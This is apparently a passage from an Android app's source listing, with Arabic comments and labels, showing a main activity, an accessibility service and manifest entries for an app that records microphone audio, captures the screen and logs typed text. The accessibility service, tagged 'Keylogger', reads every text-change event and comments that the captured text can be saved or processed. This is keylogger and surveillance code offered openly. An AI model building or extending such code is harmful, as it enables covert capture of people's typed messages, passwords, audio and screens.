2. MainActivity.kt

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var btnStartStopRecording: Button
    private lateinit var btnStartStopScreenshot: Button
    private lateinit var btnEnableAccessibility: Button

    private val SCREEN_CAPTURE_REQUEST_CODE = 1001

    private var isRecording = false
    private var isScreenshotRunning = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btnStartStopRecording = findViewById(R.id.btnStartStopRecording)
        btnStartStopScreenshot = findViewById(R.id.btnStartStopScreenshot)
        btnEnableAccessibility = findViewById(R.id.btnEnableAccessibility)

        btnStartStopRecording.setOnClickListener {
            if (!isRecording) {
                startRecordingService()
            } else {
                stopRecordingService()
            }
            isRecording = !isRecording
            updateRecordingButton()
        }

        btnStartStopScreenshot.setOnClickListener {
            if (!isScreenshotRunning) {
                requestScreenCapturePermission()
            } else {
                stopScreenshotService()
                isScreenshotRunning = false
                updateScreenshotButton()
            }
        }

        btnEnableAccessibility.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }

        updateRecordingButton()
        updateScreenshotButton()
    }

    private fun updateRecordingButton() {
        btnStartStopRecording.text = if (isRecording) "إيقاف التسجيل الصوتي" else "بدء التسجيل الصوتي"
    }

    private fun updateScreenshotButton() {
        btnStartStopScreenshot.text = if (isScreenshotRunning) "إيقاف التقاط الشاشة" else "بدء التقاط الشاشة"
    }

    private fun startRecordingService() {
        val intent = Intent(this, RecordingAndScreenshotService::class.java)
        intent.action = RecordingAndScreenshotService.ACTION_START_RECORDING
        startService(intent)
    }

    private fun stopRecordingService() {
        val intent = Intent(this, RecordingAndScreenshotService::class.java)
        intent.action = RecordingAndScreenshotService.ACTION_STOP_RECORDING
        startService(intent)
    }

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(captureIntent, SCREEN_CAPTURE_REQUEST_CODE)
    }

    private fun startScreenshotService(resultCode: Int, data: Intent) {
        val intent = Intent(this, RecordingAndScreenshotService::class.java)
        intent.action = RecordingAndScreenshotService.ACTION_START_SCREENSHOT
        intent.putExtra("resultCode", resultCode)
        intent.putExtra("data", data)
        startService(intent)
        isScreenshotRunning = true
        updateScreenshotButton()
    }

    private fun stopScreenshotService() {
        val intent = Intent(this, RecordingAndScreenshotService::class.java)
        intent.action = RecordingAndScreenshotService.ACTION_STOP_SCREENSHOT
        startService(intent)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            startScreenshotService(resultCode, data)
        }
    }
}

3. خدمة إمكانية الوصول MyAccessibilityService.kt

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = it.text?.joinToString(separator = "") ?: ""
                Log.d("Keylogger", "Text changed: $text")
                // هنا يمكنك حفظ النصوص أو معالجتها حسب الحاجة
            }
        }
    }

    override fun onInterrupt() {
        // التعامل مع المقاطعة
    }
}

    <application
        ... >

        <service
            android:name=".RecordingAndScreenshotService"
            android:foregroundServiceType="microphone|mediaProjection"
            android:exported="false" />

        <service
            android:name=".MyAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

    </application>

</manifest>
